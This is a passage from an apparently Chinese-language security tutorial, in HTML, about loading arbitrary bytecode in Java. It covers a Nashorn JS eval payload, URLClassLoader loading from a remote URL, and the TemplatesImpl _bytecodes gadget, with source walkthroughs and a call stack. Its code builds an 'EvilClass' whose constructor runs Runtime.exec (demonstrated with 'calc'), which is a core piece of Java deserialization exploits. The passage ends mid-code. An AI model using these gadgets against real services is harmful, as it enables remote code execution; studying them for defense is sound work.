<h3 id="JS-引擎"><a href="#JS-引擎" class="headerlink" title="JS 引擎"></a>JS 引擎</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getJsPayload</span><span class="params">(String code)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;var data = &#x27;&quot;</span> + code + <span class="string">&quot;&#x27;;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var bytes = java.util.Base64.getDecoder().decode(data);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var int = Java.type(\&quot;int\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\&quot;defineClass\&quot;, bytes.class, int.class, int.class);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;defineClassMethod.setAccessible(true);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var cc = defineClassMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;cc.getConstructor().newInstance();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">manager.getEngineByName(<span class="string">&quot;js&quot;</span>).eval(getJsPayload2(Base64.getEncoder().encodeToString(getEvilCode(<span class="string">&quot;calc&quot;</span>))));</span><br></pre></td></tr></table></figure></div>

<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader</code> 的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的 Java 类加载器的工作流程。</p>
<p>正常情况下，Java 会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code> 中列举到的基础路径（这些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找 <code>.class</code> 文件来加载，而这个基础路径有分为三种情况：</p>
<ul>
<li>URL 未以斜杠 <code>/</code> 结尾，则认为是一个 JAR 文件，使用 <code>JarLoader</code> 来寻找类，即为在 Jar 包中寻找 <code>.class</code> 文件。</li>
<li>URL 以斜杠 <code>/</code> 结尾，且协议名是 <code>file</code>，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找 <code>.class</code>文件。</li>
<li>URL 以斜杠 <code>/</code> 结尾，且协议名不是 <code>file</code>，则使用最基础的 <code>ClassLoader</code> 来寻找类。</li>
</ul>
<p>我们正常开发的时候通常遇到的是前两者，使用 <code>Loader</code> 寻找类是非 file 协议的情况下，最常见的就是 <code>http</code> 协议，此时会用到 <code>URLClassLoader</code> 。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpClassLoaderExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 指定远程服务器上的jar文件路径</span></span><br><span class="line">            URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://example.com/path/to/your/jarfile/jarfile.jar&quot;</span>)&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader实例</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(urls);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 假设远程服务器上有一个类 com.example.MyClass</span></span><br><span class="line">            Class&lt;?&gt; cls = loader.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出加载的类的名称</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Class loaded: &quot;</span> + cls.getName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建该类的实例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> cls.newInstance();</span><br><span class="line">            System.out.println(<span class="string">&quot;Instance created: &quot;</span> + instance);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用类中的一个方法</span></span><br><span class="line">            cls.getMethod(<span class="string">&quot;someMethod&quot;</span>).invoke(instance);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭URLClassLoader，释放资源</span></span><br><span class="line">            loader.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果是远程加载 <code>.class</code> 文件，路径为 <code>http://example.com/path/to/your/classes/</code>，然后 <code>loadClass</code> 传入的是 <code>.class</code> 文件的文件名（没有后缀）。</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 是 Java 中存在于 Xalan XSLT 处理器中的一个类，它实现了 <code>javax.xml.transform.Templates</code> 接口。<code>TemplatesImpl</code> 是 XSLT 处理中的一个重要类，主要用于表示一个经过编译的 XSLT 样式表，并且可以通过这个类多次应用样式表来转换 XML 文档。</p>
<p><code>TemplatesImpl</code> 类内部有几个关键的字段和方法，这些字段在安全研究中经常被提及：</p>
<ul>
<li><strong><code>private String _name</code></strong> ：样式表的名称。</li>
<li><strong><code>private byte[][] _bytecodes</code></strong> ：存储了经过编译的字节码的数组，这些字节码会在运行时被加载并执行。</li>
<li><strong><code>private transient TransformerFactoryImpl _tfactory</code></strong> ：<code>TransformerFactory</code> 的引用，用于生成 <code>Transformer</code> 对象。</li>
</ul>
<p>这些字段中的 <code>_bytecodes</code> 和 <code>_class</code> 是特别重要的，因为它们直接涉及到字节码的加载和类的定义。</p>
<p><code>TemplatesImpl</code> 类中定义的内部类 <code>TransletClassLoader</code> 是一个自定义的类加载器。这个类加载器的主要作用是用于加载和定义通过 XSLT 编译的 Java 类（称为 translet）。这些类是在 XSLT 编译过程中动态生成的，用于执行特定的 XSLT 转换操作。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个类里重写了 <code>defineClass</code> 方法，并且这里没有显式地声明其定义域。也就是说这里的 <code>defineClass</code> 由其父类的 <code>protected</code> 类型变成了一个 <code>default</code> 类型的方法，可以被类外部调用。</p>
<blockquote>
<p>Java 中默情况下，如果一个方法没有显式声明作用域，其作用域为 <strong>包私有（default）</strong>。这意味着该方法只能在同一包内被访问，其他包的类无法访问该方法。</p>
</blockquote>
<p>例如下面这段代码，我们通过调用 <code>TemplatesImpl</code> 的 <code>getOutputProperties</code> 方法成功加载了设置在 <code>_bytecodes</code> 字段中的字节码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] classByteCode = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classByteCode&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:34, DefineClassExample (com.example)</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>getOutputProperties</code> 函数中会调用 <code>newTransformer</code> 函数，然后在 <code>newTransformer</code> 函数中调用 <code>getTransletInstance</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现了 JAXP 的 Templates.newTransformer() 方法。</span></span><br><span class="line"><span class="comment"> * 该方法用于创建一个新的 Transformer 实例，并返回它。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> TransformerConfigurationException 如果配置过程中出现错误，则抛出该异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的 Transformer 实例，传入必要的参数，如 Translet 实例、输出属性、缩进设置和工厂</span></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现了 JAXP 的 Templates.getOutputProperties() 方法。</span></span><br><span class="line"><span class="comment"> * 该方法需要实例化一个 Translet 来获取输出设置，</span></span><br><span class="line"><span class="comment"> * 因此我们可以直接实例化一个 Transformer，并使用它的实现来获取输出属性。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回输出属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用 newTransformer() 方法来获取输出属性</span></span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="comment">// 如果发生配置异常，返回 null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为我们给 <code>TemplatesImpl</code> 的 <code>_name</code> 设置有值，因此会执行下面的 <code>defineTransletClasses</code> 来根据字节码数组 <code>private byte[][] _bytecodes</code> 中存放字节码依次调用的初始化 <code>private Class[] _class</code>，之后会将加载的下标为 <code>_transletIndex</code> 的类实例化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该方法生成一个包含在模板中的 Translet 类实例。</span></span><br><span class="line"><span class="comment"> * 生成的 Translet 实例将随后被封装在一个 Transformer 对象中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> TransformerConfigurationException 如果创建 Translet 实例时发生错误，则抛出此异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回创建的 Translet 实例</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 如果 _name 为空，则返回 null</span></span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果类没有被定义，则调用 defineTransletClasses 方法定义 Translet 类</span></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建 Translet 实例</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p><code>defineTransletClasses</code> 函数中使用 <code>TransletClassLoader</code> 加载类，也就是调用 <code>defineClass</code> 将字节码加载为类。之后调用 <code>getSuperclass</code> 获取加载的类的直接父类并判断父类的名称是否为 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。如果是则设置 <code>_transletIndex</code> 为当前加载类的下标，也就以为着这个类要被实例化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 所有 translet 类的父类名。这是为了确定在所有构成 translet 的类中，</span></span><br><span class="line"><span class="comment"> * 哪个类是主类（即继承自该父类的类）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">    <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定义并加载 translet 类及其辅助类。</span></span><br><span class="line"><span class="comment"> * 返回定义的主类对象的引用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果字节码为空，抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用特权代码创建自定义的 TransletClassLoader</span></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">// 创建 TransletClassLoader 并使用 ObjectFactory 找到合适的父类加载器</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取字节码的数量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        <span class="comment">// 初始化类数组</span></span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果类的数量大于 1，初始化辅助类的存储结构</span></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历字节码数组，逐个加载类</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            <span class="comment">// 使用自定义类加载器加载字节码定义的类</span></span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="comment">// 获取类的父类</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查当前类是否为主类（继承自 ABSTRACT_TRANSLET，即 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet）</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                <span class="comment">// 如果是主类，记录下主类的索引</span></span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果是辅助类，将其加入到辅助类集合中</span></span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有找到主类，抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 针对字节码格式错误和加载类时发生链接错误的异常处理</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这就要求 <code>TemplatesImpl</code> 中对加载的字节码对应的类必须<br>是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类。所以我们需要构造一个满足这一要求的类：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 